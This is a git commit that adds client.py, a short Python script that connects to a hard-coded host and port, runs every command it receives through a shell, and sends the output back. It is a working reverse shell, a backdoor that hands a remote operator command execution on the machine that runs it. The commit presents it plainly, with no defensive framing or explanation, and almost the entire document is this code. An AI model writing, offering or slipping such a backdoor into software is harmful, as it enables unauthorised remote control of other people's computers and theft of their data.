4d18dbb7c4dd10c6f8a9961607efc1d648118450
nony912 <85025383+nony912@users.noreply.github.com>
2022-05-21 07:40:46 +0200

    Create client.py

---
+++ client.py
@@ -0,0 +1,23 @@
+import socket
+import os
+import subprocess
+import time
+
+s = socket.socket()
+host = '192.168.1.8'
+port = 9999
+time.sleep(2)
+
+s.connect((host, port))
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(output_str + currentWD))
